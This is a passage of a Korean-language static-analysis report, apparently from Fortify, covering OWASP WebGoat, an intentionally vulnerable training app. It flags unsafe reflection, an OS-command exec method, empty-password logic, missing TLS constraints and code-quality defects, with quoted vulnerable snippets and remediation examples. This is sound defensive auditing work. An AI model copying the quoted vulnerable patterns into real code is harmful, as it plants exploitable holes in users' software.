                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>공격자가 DatabaseUtilities.java의 66 줄에서 forName() 리플렉션 메서드의 인수를 제어할 수 있습니다. 이로 인해 응용 프로그램을 통해 예기치 못한 제어 흐름 경로를 만들어 보안 검사를 무시할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>66</LineStart>
<Snippet>	    throws ClassNotFoundException, SQLException
    {
	Class.forName(s.getDatabaseDriver());

	return (DriverManager.getConnection(s.getDatabaseConnectionString()));</Snippet>
<TargetFunction>java.lang.Class.forName()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Code Correctness: Byte Array to String Conversion</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Encoding.java의 266 줄에서 String()을 호출하면 바이트 배열이 String으로 변환되므로 데이터가 손실될 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>바이트 배열의 데이터를 String으로 변환할 때 해당되는 문자 집합 외부의 데이터가 어떻게 변환되는지는 지정되지 않습니다. 따라서 데이터가 손실되거나, 적절한 보안 대책을 따르기 위해 이진 데이터가 필요할 때 보안 수준이 낮아질 수 있습니다.

예제 1: 다음 코드는 해시를 만들기 위해 데이터를 String으로 변환합니다.


  ...
  FileInputStream fis = new FileInputStream(myFile);
  byte[] byteArr = byte[BUFSIZE];
  ...
  int count = fis.read(byteArr);
  ...
  String fileString = new String(byteArr);
  String fileSHA256Hex = DigestUtils.sha256Hex(fileString);
  // use fileSHA256Hex to validate file
  ...


파일 크기가 BUFSIZE보다 작다고 가정할 때 myFile의 정보를 기본 문자 집합과 같이 인코딩하면 이 코드는 문제 없이 작동합니다. 그러나 이 파일이 다른 인코딩을 사용하거나 이진 파일인 경우에는 정보가 손실됩니다. 그러면 결과로 생성되는 SHA 해시의 안정성이 떨어질 수 있으며, 충돌이 발생하기가 훨씬 쉬워집니다. 특히 기본 문자 집합 외부의 모든 데이터가 물음표 등의 같은 값으로 표현되는 경우에는 더욱 그러합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>일반적으로 문자가 아닌 데이터를 포함하고 있을 수 있는 바이트 배열은 기능이 손상될 수 있으므로 String 개체로 변환해서는 안 됩니다. 그러나 이 경우 훨씬 더 큰 보안 문제를 야기할 수도 있습니다. 대부분의 경우에는 실제로 바이트 배열을 String으로 변환할 필요가 없습니다. 그러나 이진 데이터에서 String 개체를 만들어야 하는 구체적인 이유가 있으면 먼저 기본 문자 집합에 포함되지 않도록 이진 데이터를 인코딩해야 합니다.

예제 2: 다음 예제에서는 검증 문제를 방지하기 위해 Example 1에 나오는 API의 다른 변형을 사용합니다.


  ...
  FileInputStream fis = new FileInputStream(myFile);
  byte[] byteArr = byte[BUFSIZE];
  ...
  int count = fis.read(byteArr);
  ...
  byte[] fileSHA256 = DigestUtils.sha256(byteArr);
  // use fileSHA256 to validate file, comparing hash byte-by-byte.
  ...


이 경우에는 문제를 쉽게 해결할 수 있습니다. 이 API에는 바이트 배열을 허용하는 변형을 비롯한 오버로드된 변형이 있기 때문입니다. 또한 FileInputStream 개체를 인수로 허용하는 DigestUtils.sha256()의 다른 오버로드된 변형을 사용하면 문제를 더욱 간단히 해결할 수 있습니다. 다른 시나리오의 경우에는 바이트 배열이 문자 집합 외부의 데이터를 포함할 수 있는지 여부와 추가 리팩터링이 필요한지 여부를 면밀하게 고려해야 합니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="3D0034E039A6E0A13772F4ADD5BD9265" ruleID="993CC475-24A5-4BBD-A008-67045CCA0ACB">
                            <Category>Code Correctness: Byte Array to String Conversion</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Encoding.java의 911 줄에서 String()을 호출하면 바이트 배열이 String으로 변환되므로 데이터가 손실될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>911</LineStart>
<Snippet>			CharsetEncoder encoder = charset.newEncoder();
			ByteBuffer bbuf = encoder.encode( CharBuffer.wrap( str ) );
			return ( new String( bbuf.array() ) );
		}
		catch ( Exception e )</Snippet>
<TargetFunction>String()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="621F63B48D8B4198A5CC0417D7082A53" ruleID="993CC475-24A5-4BBD-A008-67045CCA0ACB">
                            <Category>Code Correctness: Byte Array to String Conversion</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Encoding.java의 266 줄에서 String()을 호출하면 바이트 배열이 String으로 변환되므로 데이터가 손실될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>266</LineStart>
<Snippet>		byte[] b = decoder.decodeBuffer( str );

		return ( new String( b ) );
	}
</Snippet>
<TargetFunction>String()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Dead Code: Unused Method</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>HammerHead.java의 dumpSession() 메서드는 클래스 외부의 메서드가 접근할 수 없습니다. Dead code 입니다. Dead code는 public 메서드에 의해 직접적 또는 간접적으로 실행되지 않는 코드로 정의됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>이 메서드는 호출되지 않거나 다른 dead code에서만 호출합니다.

예제 1: 다음 클래스에서 doWork() 메서드는 호출되지 않습니다.


public class Dead {
  private void doWork() {
    System.out.println("doing work");
  }
  public static void main(String[] args) {
    System.out.println("running Dead");
  }
}


예제 2: 다음 클래스에서 두 private 메서드는 서로를 호출하지만 다른 곳에서 어느 쪽도 호출하지 않기 때문에 둘 다 dead code가 됩니다.


public class DoubleDead {
  private void doTweedledee() {
    doTweedledumb();
  }
  private void doTweedledumb() {
    doTweedledee();
  }
  public static void main(String[] args) {
    System.out.println("running DoubleDead");
  }
}


(이 경우 다음과 같이 메서드가 실행되지 않는 것이 좋습니다. 어느 한 쪽을 호출하면 무한 루프가 발생하기 때문입니다.)</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>비실행 메서드는 디스패치 코드에 버그가 있음을 의미하는 것일 수 있습니다. 

예제 3: 다음 디스패치 메서드가 있는 클래스에서 getWitch()라는 메서드가 비실행으로 플래그 지정되면 이는 복사 및 붙여넣기 오류 때문일 수 있습니다. 'w' case는 getMummy()가 아닌 getWitch()를 반환해야 합니다.


public ScaryThing getScaryThing(char st) {
  switch(st) {
    case 'm':
      return getMummy();
    case 'w':
      return getMummy();
    default:
      return getBlob();
  }
}


일반적으로 dead code는 수정하거나 삭제하는 것이 좋습니다. Dead code를 수정하려면, public 메서드를 통해 Dead code를 직접적 또는 간접적으로 실행합니다. Dead code는 프로그램의 기능에는 도움이 되지 않고 복잡성과 유지 관리 부담만 유발합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. 이 이슈는 프로그램이 리플렉션을 사용하여 private 메서드에 접근하는 경우 잘못된 오류 판정이 될 수 있습니다. (이는 비표준 방법입니다. 리플렉션을 통해서만 호출하는 private 메서드에 대해서는 상세히 기록해야 합니다.)</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="6B21E97CFCB72AEAF78F934815DA0258" ruleID="6F84D4B0-3B7E-4463-A165-76135931D192">
                            <Category>Dead Code: Unused Method</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CommandInjection.java의 exec() 메서드는 클래스 외부의 메서드가 접근할 수 없습니다. Dead code 입니다. Dead code는 public 메서드에 의해 직접적 또는 간접적으로 실행되지 않는 코드로 정의됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CommandInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CommandInjection.java</FilePath>
<LineStart>304</LineStart>
<Snippet>     * @return          Description of the Return Value
     */
    private Element exec(WebSession s, String command, String args)
    {
	System.out.println("Executing OS command: '" + command</Snippet>
<TargetFunction>Function: exec()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0FE09111D584C0E2862D878C283B4749" ruleID="6F84D4B0-3B7E-4463-A165-76135931D192">
                            <Category>Dead Code: Unused Method</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>HammerHead.java의 dumpSession() 메서드는 클래스 외부의 메서드가 접근할 수 없습니다. Dead code 입니다. Dead code는 public 메서드에 의해 직접적 또는 간접적으로 실행되지 않는 코드로 정의됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>237</LineStart>
<Snippet>     *        Description of the Parameter
     */
    private void dumpSession(HttpSession session)
    {
	Enumeration enumerator = session.getAttributeNames();</Snippet>
<TargetFunction>Function: dumpSession()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>J2EE Misconfiguration: Missing Data Transport Constraint</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>사용자 데이터 제약 조건을 지정하지 않는 보안 제약 조건은 제한된 리소스가 전송 계층에서 보호된다는 것을 보장할 수 없습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>web.xml 보안 제약 조건은 일반적으로 RBAC(Role-Based Access Control)에 사용되지만 선택적 user-data-constraint 요소로 콘텐트의 안전하지 않은 전송을 차단하는 전송 보증을 지정할 수 있습니다.

&lt;user-data-constraint&gt; 태그 안에서 &lt;transport-guarantee&gt; 태그는 통신의 처리 방법을 정의합니다. 전송 보증에는 3가지 수준이 있습니다.

1) NONE은 응용 프로그램에서 전송 보증을 요구하지 않음을 의미합니다.
2) INTEGRAL은 응용 프로그램에서 클라이언트와 서버 간에 전송되는 데이터를 전송 중에 변경할 수 없는 방식으로 전송할 것을 요구함을 의미합니다.
3) CONFIDENTIAL은 응용 프로그램에서 다른 엔티티가 전송 내용을 관찰할 수 없는 방식으로 데이터를 전송할 것을 요구함을 의미합니다.



대부분의 상황에서 INTEGRAL 또는 CONFIDENTIAL의 사용은 SSL/TLS가 필요함을 의미합니다. &lt;user-data-constraint&gt; 및 &lt;transport-guarantee&gt; 태그가 생략된 경우 전송 보증은 기본적으로 NONE으로 설정됩니다.

예제 1: 다음 보안 제약 조건은 전송 보증을 지정하지 않습니다.

&lt;security-constraint&gt;
    &lt;web-resource-collection&gt;
        &lt;web-resource-name&gt;Storefront&lt;/web-resource-name&gt;
        &lt;description&gt;Allow Customers and Employees access to online store front&lt;/description&gt;
        &lt;url-pattern&gt;/store/shop/*&lt;/url-pattern&gt;
    &lt;/web-resource-collection&gt;
    &lt;auth-constraint&gt;
        &lt;description&gt;Anyone&lt;/description&gt;
        &lt;role-name&gt;anyone&lt;/role-name&gt;
    &lt;/auth-constraint&gt;
&lt;/security-constraint&gt;
&#13;
이 카테고리는 Cigital Java Rulepack에서 비롯되었습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>권한 부여 제약 조건을 정의할 때마다 CONFIDENTIAL 전송 보증을 지정하십시오. 응용 프로그램의 한 부분으로 가는 트래픽을 암호화하기로 결정한 후에는 응용 프로그램의 다른 부분으로 가는 트래픽의 비암호화를 허용하는 실수를 저지르지 마십시오. 세션 쿠키 또는 다른 민감한 정보가 안전하지 않은 채널을 통해 전송될 수 있습니다.

예제 2: 다음 보안 제약 조건은 CONFIDENTIAL 전송 보증을 지정합니다.

&lt;security-constraint&gt;
    &lt;web-resource-collection&gt;
        &lt;web-resource-name&gt;Storefront&lt;/web-resource-name&gt;
        &lt;description&gt;Allow Customers and Employees access to online store front&lt;/description&gt;
        &lt;url-pattern&gt;/store/shop/*&lt;/url-pattern&gt;
    &lt;/web-resource-collection&gt;
    &lt;auth-constraint&gt;
        &lt;description&gt;Anyone&lt;/description&gt;
        &lt;role-name&gt;anyone&lt;/role-name&gt;
    &lt;/auth-constraint&gt;
    &lt;user-data-constraint&gt;
        &lt;transport-guarantee&gt;CONFIDENTIAL&lt;/transport-guarantee&gt;
    &lt;/user-data-constraint&gt;
&lt;/security-constraint&gt;
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="4745492F4C56918DB027E1B7D27069F8" ruleID="AA4DA365-6889-4FC1-B666-1864FC00D921">
                            <Category>J2EE Misconfiguration: Missing Data Transport Constraint</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>사용자 데이터 제약 조건을 지정하지 않는 보안 제약 조건은 제한된 리소스가 전송 계층에서 보호된다는 것을 보장할 수 없습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>WebContent/WEB-INF/web.xml</FilePath>
<LineStart>274</LineStart>
<Snippet>
	&lt;!-- Define a Security Constraint on this Application --&gt;
	&lt;security-constraint&gt;
	    &lt;web-resource-collection&gt;
	      &lt;web-resource-name&gt;WebGoat Application&lt;/web-resource-name&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="4745492F4C56918DB027E1B7D27069F9" ruleID="AA4DA365-6889-4FC1-B666-1864FC00D921">
                            <Category>J2EE Misconfiguration: Missing Data Transport Constraint</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>사용자 데이터 제약 조건을 지정하지 않는 보안 제약 조건은 제한된 리소스가 전송 계층에서 보호된다는 것을 보장할 수 없습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>WebContent/WEB-INF/web.xml</FilePath>
<LineStart>286</LineStart>
<Snippet>	&lt;/security-constraint&gt;
	
	&lt;security-constraint&gt;
	    &lt;web-resource-collection&gt;
	      &lt;web-resource-name&gt;WebGoat Application Source&lt;/web-resource-name&gt;</Snippet>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Missing Check for Null Parameter</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>AbstractLesson의 equals() 선언은 해당 매개 변수와 null을 비교하지 못합니다. 이는 메서드의 약정 위반입니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Java 표준에 따르면 해당 매개 변수가 null인 경우 Object.equals(), Comparable.compareTo() 및 Comparator.compare()의 구현은 지정된 값을 반환해야 합니다. 이 약정을 따르지 않으면 예기치 못한 동작이 발생할 수 있습니다.

예제 1: 다음 equals() 메서드의 구현은 해당 매개 변수와 null을 비교하지 않습니다.


public boolean equals(Object object)
{
   return (toString().equals(object.toString()));
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>null 매개 변수를 수신할 경우 Object.equals()가 null을 반환해야 하는 약정을 항상 따르십시오.

예제 2: 이전 예제는 null 인수를 명시적으로 검사하고 발견 시 false를 반환하도록 다시 작성됩니다.


public boolean equals(Object object)
{
    if (object == null)
        return false;
    return (toString().equals(object.toString()));
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="F5B20153166B92D817BF3782C29D4980" ruleID="1834C857-2848-41F2-98F7-D5C5F157E729">
                            <Category>Missing Check for Null Parameter</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>AbstractLesson의 equals() 선언은 해당 매개 변수와 null을 비교하지 못합니다. 이는 메서드의 약정 위반입니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>317</LineStart>
<Snippet>     * @return Description of the Return Value
     */
    public boolean equals(Object obj)
    {
	return this.getScreenId() == ((AbstractLesson) obj).getScreenId();</Snippet>
<TargetFunction>obj = #param(0)</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2DA1FACB1915C00E7C43FF9061771897" ruleID="1834C857-2848-41F2-98F7-D5C5F157E729">
                            <Category>Missing Check for Null Parameter</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>Category의 equals() 선언은 해당 매개 변수와 null을 비교하지 못합니다. 이는 메서드의 약정 위반입니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Category.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Category.java</FilePath>
<LineStart>81</LineStart>
<Snippet>

    public boolean equals(Object obj)
    {
	return getName().equals(((Category) obj).getName());</Snippet>
<TargetFunction>obj = #param(0)</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Object Model Violation: Just one of equals() and hashCode() Defined</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>AbstractLesson 클래스는 equals()와 hashCode() 중 하나만 덮어씁니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Java 개체는 수많은 동등한 관련 규칙을 따라야 합니다. 이 규칙 중 하나는 같은 개체는 같은 해시코드를 가져야 한다는 것입니다. 즉, a.equals(b) == true이면 a.hashCode() == b.hashCode()이어야 합니다. 

이 규칙을 지키지 않으면 이 클래스의 개체를 컬렉션(collection)에 저장하는 경우 문제가 발생하기 쉽습니다. 해당 클래스의 개체가 해시 테이블의 키로 사용되거나 Map 또는 Set에 삽입되는 경우, 반드시 같은 개체는 같은 해시코드를 가져야 합니다.

예제 1: 다음 클래스는 equals()를 오버라이드하지만 hashCode()는 오버라이드하지 않습니다.


public class halfway() {
  public boolean equals(Object obj) {
    ...
  }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>FindBugs 설명서는 다음의 간단한 hashCode() "starter"를 구현할 것을 권장합니다[1]. 이는 매우 비효율적이지만 결과가 정확합니다. hashCode()가 프로그램에 중요하지 않다고 생각하면 이 구현을 고려해 보십시오.

예제 2: Example 1의 코드는 다음과 같이 다시 작성할 수 있습니다.


public class halfway() {
  public boolean equals(Object obj) {
    ...
  }

public int hashCode() {
    assert false : "hashCode not designed";
    return 42; // any arbitrary constant will do
  }
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="8A93D887707FAF67D0C6134B8419AB66" ruleID="35DEAC53-264A-472F-A1FD-F17DD14841A7">
                            <Category>Object Model Violation: Just one of equals() and hashCode() Defined</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>AbstractLesson 클래스는 equals()와 hashCode() 중 하나만 덮어씁니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>317</LineStart>
<Snippet>     * @return Description of the Return Value
     */
    public boolean equals(Object obj)
    {
	return this.getScreenId() == ((AbstractLesson) obj).getScreenId();</Snippet>
<TargetFunction>Function: equals()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B622BC093E6CFFB3E7119C5620832581" ruleID="35DEAC53-264A-472F-A1FD-F17DD14841A7">
                            <Category>Object Model Violation: Just one of equals() and hashCode() Defined</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>Category 클래스는 equals()와 hashCode() 중 하나만 덮어씁니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Category.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Category.java</FilePath>
<LineStart>81</LineStart>
<Snippet>

    public boolean equals(Object obj)
    {
	return getName().equals(((Category) obj).getName());</Snippet>
<TargetFunction>Function: equals()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Password Management: Empty Password</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>빈 암호는 쉽게 해결할 수 없는 방식으로 시스템 보안을 침해할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>빈 문자열을 암호 변수로 지정하는 것은 좋은 방법이 아닙니다. 빈 암호를 사용하여 다른 시스템을 인증하는 데 성공하게 되면 빈 암호를 받기 때문에 해당 계정의 보안이 침해될 수 있습니다. 올바른 값이 변수에 할당될 때까지 빈 암호가 단순히 자리 표시자로 사용되는 경우에는 코드에 익숙치 않은 사용자를 혼란시킬 수 있으며 예기치 못한 제어 흐름 경로에 문제를 일으킬 수 있습니다.



예제 1: 다음 코드는 빈 암호를 사용하여 데이터베이스에 연결하려 시도합니다.

    ...
    DriverManager.getConnection(url, "scott", "");
    ...


Example 1의 코드가 성공하면 데이터베이스 사용자 계정인 “scott”이 공격자가 쉽게 추측할 수 있는 빈 암호로 구성되어 있음을 나타냅니다. 프로그램을 공개한 후에는 비어 있지 않은 암호를 사용하기 위한 계정 업데이트를 위해 코드 변경이 필요합니다.

예제 2: 다음 코드는 암호 변수를 빈 문자열로 초기화하고 암호의 저장된 값 읽기를 시도하여 사용자가 제공하는 값과 비교합니다.


    ...
    String storedPassword = "";
    String temp;

    if ((temp = readPassword()) != null) {
        storedPassword = temp;
    }

    if(storedPassword.equals(userPassword))
        // Access protected resources
        ...
    }
    ...


readPassword()가 데이터베이스 오류 또는 다른 문제로 인해 저장된 암호를 검색하지 못하면 공격자가 userPassword에 대해 빈 문자열을 입력하여 암호 확인을 무시할 수 있습니다.

모바일 환경에서는 장치 분실 위험이 높기 때문에 암호 관리가 특히 중요합니다.
예제 3: 다음 코드는 사용자 이름과 암호 변수를 빈 문자열로 초기화하고, 서버가 현재 요청을 이전에 거부하지 않은 경우 Android WebView 저장소에서 자격 증명을 읽은 후 보호된 페이지를 보기 위한 인증을 설정하는 데 사용합니다.

...
webview.setWebViewClient(new WebViewClient() {
  public void onReceivedHttpAuthRequest(WebView view,
        HttpAuthHandler handler, String host, String realm) {
    String username = "";
    String password = "";

    if (handler.useHttpAuthUsernamePassword()) {
      String[] credentials = view.getHttpAuthUsernamePassword(host, realm);
      username = credentials[0];
      password = credentials[1];
    }
    handler.proceed(username, password);
  }
});
...


Example 2와 마찬가지로 useHttpAuthUsernamePassword()에서 false를 반환하면 공격자가 빈 암호를 입력하여 보호된 페이지를 볼 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>항상, 암호화된 외부 리소스에서 저장된 암호 값을 읽고 암호 변수에 의미 있는 값을 지정하십시오. 민감한 리소스를 빈 암호 또는 null 암호로 보호하지 않도록 해야 합니다.

Android의 경우 SQLite 데이터베이스를 사용하는 다른 플랫폼과 마찬가지로 SQLCipher를 대신 사용하는 것이 좋습니다. SQLCipher는 SQLite 데이터베이스에 대한 확장으로, 데이터베이스 파일의 투명한 256비트 AES 암호화를 제공합니다. 따라서 암호화된 데이터베이스에 자격 증명을 저장할 수 있습니다.

예제 4: 다음 코드는 필요한 바이너리를 다운로드한 후 SQLCipher를 Android 응용 프로그램에 통합하고 자격 증명을 데이터베이스 파일에 저장하는 방법을 보여줍니다.

import net.sqlcipher.database.SQLiteDatabase;
...
  SQLiteDatabase.loadLibs(this);
  File dbFile = getDatabasePath("credentials.db");
  dbFile.mkdirs();
  dbFile.delete();
  SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, "credentials", null);
  db.execSQL("create table credentials(u, p)");
  db.execSQL("insert into credentials(u, p) values(?, ?)", new Object[]{username, password});
...


android.database.sqlite.SQLiteDatabase 관련 참조는 net.sqlcipher.database.SQLiteDatabase 관련 참조로 대체됩니다.

WebView 저장소에서 암호화를 활성화하려면 sqlcipher.so 라이브러리를 사용하여 WebKit를 다시 컴파일해야 합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify Java Annotations FortifyPassword 및 FortifyNotPassword를 사용하여 암호를 나타내는 필드 및 변수를 표시할 수 있습니다.

